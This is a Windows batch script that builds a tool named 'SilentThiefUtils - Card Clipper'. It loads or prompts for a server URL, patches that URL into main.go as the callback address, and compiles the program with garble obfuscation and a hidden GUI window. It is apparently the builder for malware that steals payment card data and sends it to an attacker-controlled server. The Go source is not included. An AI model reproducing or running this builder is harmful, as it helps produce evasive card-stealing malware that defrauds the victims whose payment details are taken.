@echo off
setlocal enabledelayedexpansion

set "PREFIX=title SilentThiefUtils - Card Clipper"

call :settitle "Starting..."
echo.
echo  Initializing...

:: load .env if present
set "SERVER_LINK="
if exist .env (
    echo  [*] Found .env, loading...
    for /f "usebackq tokens=1,* delims==" %%a in (".env") do (
        if "%%a"=="server_url" set "SERVER_LINK=%%b"
    )
    if not "%SERVER_LINK%"=="" (
        echo  [+] Loaded _url from .env: %SERVER_LINK%
    ) else (
        echo  [*] .env found but _url is empty, will prompt.
    )
) else (
    echo  [*] No .env found.
)

:: check go
call :settitle "Checking Go..."
echo  [*] Checking for Go installation...
where go >nul 2>&1
if errorlevel 1 (
    call :settitle "ERROR"
    echo.
    echo  [ERROR] Go is not installed or not in PATH.
    echo.
    echo  Download from: https://golang.org/dl/
    echo  If already installed, add it to PATH and re-run.
    echo.
    pause
    exit /b 1
)
for /f "tokens=3" %%v in ('go version') do echo  [+] Go found: %%v

:: check / install garble
call :settitle "Checking Garble..."
echo  [*] Checking for garble...
where garble >nul 2>&1
if errorlevel 1 (
    call :settitle "Installing Garble..."
    echo  [*] Garble not found. Installing mvdan.cc/garble@latest...
    go install mvdan.cc/garble@latest
    if errorlevel 1 (
        call :settitle "ERROR"
        echo  [ERROR] Failed to install garble.
        pause
        exit /b 1
    )
    echo  [+] Garble installed successfully.
) else (
    echo  [+] Garble found.
)


call :settitle "Checking Source..."
echo  [*] Looking for main.go...
if not exist main.go (
    call :settitle "ERROR"
    echo.
    echo  [ERROR] main.go not found in current directory.
    echo.
    pause
    exit /b 1
)
echo  [+] main.go found.

if "%SERVER_LINK%"=="" (
    call :settitle "Waiting for Input..."
    echo.
    echo  Server URL (if you dont know what it is read the readme.md):
    echo.
    set /p SERVER_LINK=  ^> 
    if "%SERVER_LINK%"=="" (
        call :settitle "ERROR"
        echo.
        echo  [ERROR] No server URL entered.
        echo.
        pause
        exit /b 1
    )
)

call :settitle "Cleaning..."
if exist main.exe (
    echo  [*] Deleting old main.exe...
    del /f /q main.exe
    echo  [+] Old build deleted.
) else (
    echo  [*] No previous build found.
)

call :settitle "Patching Source..."
echo.
echo  [*] Using: %SERVER_LINK%
echo  [*] Patching serverLink in main.go...

set "PATCHER=%TEMP%\patcher_%RANDOM%.go"

(
    echo package main
    echo import ^("os"; "strings"^)
    echo func main^(^) {
    echo     data, _ := os.ReadFile^("main.go"^)
    echo     lines := strings.Split^(string^(data^), "\n"^)
    echo     found := false
    echo     for i, l := range lines {
    echo         if strings.Contains^(l, "const serverLink"^) {
    echo             lines[i] = "const serverLink = \"" + os.Args[1] + "\""
    echo             found = true
    echo         }
    echo     }
    echo     if !found { os.Exit^(1^) }
    echo     os.WriteFile^("main.go", []byte^(strings.Join^(lines, "\n"^)^), 0644^)
    echo }
) > "%PATCHER%"

go run "%PATCHER%" "%SERVER_LINK%"
if errorlevel 1 (
    call :settitle "ERROR"
    echo  [ERROR] Could not find 'const serverLink' in main.go
    del "%PATCHER%" >nul 2>&1
    pause
    exit /b 1
)
del "%PATCHER%" >nul 2>&1
echo  [+] Source patched.

:: ensure GOPATH\bin is in PATH so garble can be found
for /f "delims=" %%g in ('go env GOPATH') do set "GOPATH_DIR=%%g"
set "PATH=%GOPATH_DIR%\bin;%PATH%"

:: build
call :settitle "Building..."
echo  [*] Setting build flags...
set GOFLAGS=-trimpath
echo  [+] GOFLAGS=-trimpath
echo  [*] Running garble build...
echo      garble -seed=random -literals -tiny build -ldflags="-s -w -H=windowsgui" -o main.exe main.go
echo.

garble -seed=random -literals -tiny build -ldflags="-s -w -H=windowsgui" -o main.exe main.go

if errorlevel 1 (
    call :settitle "Build Failed"
    echo.
    echo  [ERROR] Build failed. See output above for details.
    echo.
    pause
    exit /b 1
)

call :settitle "Done"
echo.
echo  [+] Build successful ^> main.exe
echo.
pause
exit /b 0

:: ── functions ─────────────────────────────────────────────────
:settitle
title %PREFIX% - %~1
exit /b 0